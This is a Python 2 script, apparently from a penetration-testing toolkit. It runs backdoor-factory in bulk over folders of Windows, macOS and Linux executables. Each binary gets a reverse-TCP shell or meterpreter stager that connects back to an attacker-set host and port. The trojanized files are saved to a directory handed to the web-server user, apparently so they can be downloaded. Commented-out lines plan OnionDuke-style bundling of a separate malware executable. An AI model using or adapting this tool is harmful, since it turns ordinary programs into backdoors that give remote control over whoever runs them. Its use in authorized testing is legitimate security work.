#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2017, Carlos Polop Martin <carlospolop[at]gmail.com
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted
# provided that the following conditions are met:
#
# Redistributions of source code must retain the above copyright notice, this list of conditions and
# the following disclaimer.
#
# Redistributions in binary form must reproduce the above copyright notice, this list of conditions
# and the following disclaimer in the documentation and/or other materials provided with the
# distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
# IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
# IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
# OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import os
import subprocess
import shutil
import sys
from config_paths import *

bdf_pre_path = KAOSK_path+"BDF_prepared/"
exe_folder = "exes/"
onionduke_folder = "onionduke/"
macos_folder = "mac_os/"
linux_folder = "linux/"
main_save_path = main_path+"BDF/"

def main_directory():
    if os.path.exists(main_save_path):
        shutil.rmtree(main_save_path)
    os.makedirs(main_save_path)

def create_directory(path):
    if os.path.exists(path):
        shutil.rmtree(path)
    os.makedirs(path)

def rm_backdoored_folder():
    if os.path.exists("backdoored"):
        shutil.rmtree("backdoored")

def second_directories():
    create_directory(main_save_path + exe_folder + onionduke_folder)
    create_directory(main_save_path + macos_folder)
    create_directory(main_save_path + linux_folder)

#Formato {payload:puerto , payload:puerto , payload:puerto , ...}
def payloads():
    payloads = {}
    f = open(payloads_path,'r')
    try:
        for line in f:
            linea = line.split(" ")
            if linea[1]:
                payloads[linea[0].strip()] = linea[1].strip()
    except:
        print("Incorrect payloads file: "+payloads_path)
    finally:
        f.close()
        return payloads


def file_walk(path):
    archivos = []
    for base, dirs, files in os.walk(path):
        for name in files:
            file_path = os.path.join(base,name).replace("./","")
            archivos.append(file_path)
    return archivos

def exe_backdoors():
    exes_path = bdf_pre_path + exe_folder
    os.chdir(exes_path)
    exes = file_walk(".")
    lport = payloads_dic["windows/meterpreter/reverse_tcp"]
    for exe in exes:
        if ".exe" in exe:
            try:
                #AUTO
                exe_save_path = main_save_path + exe_folder + exe
                comando = "backdoor-factory -f " + exe + " -s iat_reverse_tcp_stager_threaded -H "+LHOST+" -P "+lport+" -J -m automatic -R -q"
                print "-------------------------------------------------"
                print comando
                subprocess.check_output(comando, shell=True)
                if os.path.exists("backdoored/"+exe):
                    os.rename("backdoored/"+exe, exe_save_path)
                #ONIONDUKE --> TOdO para que funcione onion duke le tenemos que dar tanto el ejecutable a infectar, como el payload que queremos que coora como malware (un .exe)
                #ex: -f procexp.exe -m onionduke -b MALWARE.exe (quiza msfvenom?)
                #exe_save_path = main_save_path + exe_folder + onionduke_folder + exe
                #comando = "backdoor-factory -f " + exe + " -s iat_reverse_tcp_stager_threaded -H "+LHOST+" -P "+lport+" -J -m onionduke -R -q"
                #print "-------------------------------------------------"
                #print comando
                #subprocess.check_output(comando, shell=True)
                #if os.path.exists("backdoored/"+exe):
                #    os.rename("backdoored/"+exe, exe_save_path)
            except subprocess.CalledProcessError as e:
                print "Couldn't create the backdoor of: "+exe
            finally:
                rm_backdoored_folder()


def macos_backdoors():
    macos_path = bdf_pre_path + macos_folder
    os.chdir(macos_path)
    macos = file_walk(".")
    lport = payloads_dic["osx/x64/shell_reverse_tcp"]
    for maco in macos:
        try:
            maco_save_path = main_save_path + macos_folder + maco
            comando = "backdoor-factory -f " + maco + " -s reverse_shell_tcp -H "+LHOST+" -P "+lport
            print "-------------------------------------------------"
            print comando
            subprocess.check_output(comando, shell=True)
            if os.path.exists("backdoored/"+maco):
                os.rename("backdoored/"+maco, maco_save_path)
        except subprocess.CalledProcessError as e:
            print "Couldn't create the backdoor of: " + maco
        finally:
            rm_backdoored_folder()


def linux_backdoors():
    linux_path = bdf_pre_path + linux_folder
    os.chdir(linux_path)
    linuxs = file_walk(".")
    lport = payloads_dic["linux/x86/shell/reverse_tcp"]
    for linux in linuxs:
        try:
            linux_save_path = main_save_path + linux_folder + linux
            comando = "backdoor-factory -f " + linux + " -s reverse_shell_tcp -H "+LHOST+" -P "+lport
            print "-------------------------------------------------"
            print comando
            subprocess.check_output(comando, shell=True)
            if os.path.exists("backdoored/"+linux):
                os.rename("backdoored/"+linux, linux_save_path)
        except subprocess.CalledProcessError as e:
            print "Couldn't create the backdoor of: " + linux
        finally:
            rm_backdoored_folder()


###############
## MAIN PART ##
###############
print ""
print "#################################################"
print "BACKDOOR-FACTORY:"

if len(sys.argv) > 1:
    if ip_validator(sys.argv[1]):
        LHOST = sys.argv[1]
    else:
        print "Give a correct Ip address"
        exit(-1)
else:
    LHOST = autoLHOST()
    print "Using IP: "+LHOST

main_directory()
second_directories()
payloads_dic = payloads()

print "-------------------------------------------------"
exe_backdoors()
macos_backdoors()
linux_backdoors()
print "_________________________________________________"
os.system("chown www-data -R "+main_save_path)
